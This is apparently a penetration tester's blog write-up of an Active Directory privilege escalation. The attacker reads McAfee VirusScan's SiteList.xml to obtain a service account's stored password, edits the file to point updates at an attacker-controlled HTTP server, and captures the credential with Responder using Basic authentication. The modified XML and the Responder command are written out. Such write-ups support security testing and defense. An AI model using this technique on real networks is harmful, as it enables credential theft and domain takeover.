
# McAfee privileged SiteList.xml leads to Active Directory domain privilege escalation

During an intern pentest, I came accross a nice way to privesc in an Active Directory domain.
I owned an employee's laptop with *McAfee Virusscan Enterprise 8.8* installed and a low privilege account.

Mcafee has a feature to customize update servers and can connect to these servers via HTTP or SMB.
The file *SiteList.xml* contains juicy informations like credentials, domain name servers, ... it looks like this :

###### C:\ProgramData\McAfee\Common Framework\SiteList.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<ns:SiteLists xmlns:ns="naSiteList" Type="Client">
<SiteList Default="1" Name="SomeGUID">

<HttpSite Type="fallback" Name="McAfeeHttp" Order="26" Enabled="1" Local="0" Server="update.nai.com:80">
<RelativePath>Products/CommonUpdater</RelativePath><UseAuth>0</UseAuth>
<UserName></UserName>
<Password Encrypted="1">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</Password>
</HttpSite>

<UNCSite Type="repository" Name="Paris" Order="13" Server="paris001" Enabled="1" Local="0">
<ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount>
<DomainName>companydomain</DomainName>
<UserName>McAfeeService</UserName>
<Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
</UNCSite>

<UNCSite Type="repository" Name="Tokyo" Order="18" Server="tokyo000" Enabled="1" Local="0">
<ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount>
<DomainName>companydomain</DomainName>
<UserName>McAfeeService</UserName>
<Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
</UNCSite>

</SiteList></ns:SiteLists>
```

Let's check which rights we got with *McAfeeService* :

```
PS C:\Users\TAirane> net user McAfeeService /domain
The request will be processed at a domain controller for domain companydomain. 

User name                     McAfeeService
Full Name                     McAfee ePO
Comment                       Service Account for ePO Replication
User's comment
Country/region code           000 (System Default)
Account active                Yes
Account expires               Never
Password last set             29/01/2007 16:03:12
Password expires              Never
Password changeable           29/01/2007 16:03:12
Password required             Yes
User may change password      Yes

Workstations allowed          All
Logon script
User profile
Home directory
Last logon                    29/01/2016 17:55:09

Logon hours allowed           All

Local Group Memberships       *All Repository*Repository
Global Group memberships      *Domain Services Account*Workstations Administrator
                              *Servers Administrator*Domain Users
                              
The command completed successfully. 
```

Unfortunately McAfee used GUI password, I couldn't edit the file. Thus, I downloaded and installed the AV on my Windows Virtual Machine and just copied/pasted my own SiteList.xml with the previous precious sesame.

At this time, I knew that It was close. I edited the file like I could force an HTTP connection to any random server that I could spoof with *Responder*. *Responder* has this nice feature to return an HTTP authentication to fool people. Actually the SiteList.xml looks like this :

###### C:\ProgramData\McAfee\Common Framework\SiteList.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<ns:SiteLists xmlns:ns="naSiteList" Type="Client">
<SiteList Default="1" Name="SomeGUID">

<HttpSite Type="fallback" Name="PWNED!" Order="26" Enabled="1" Local="0" Server="fuckingrandomserver:80">
<RelativePath>POO</RelativePath><UseAuth>1</UseAuth>
<UserName>McAfeeService</UserName>
<Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
</HttpSite>

</SiteList></ns:SiteLists>
```

And the *Responder* command line is :

```
root@kali:~/Tools/responder# python Responder.py -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Original work by Laurent Gaffie (lgaffie@trustwave.com)
  To kill this script hit CRTL-C
...
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
...

root@kali:~/Tools/responder# python Responder.py -I eth0 --basic
```

Ty !

[@tfairane](https://twitter.com/tfairane)
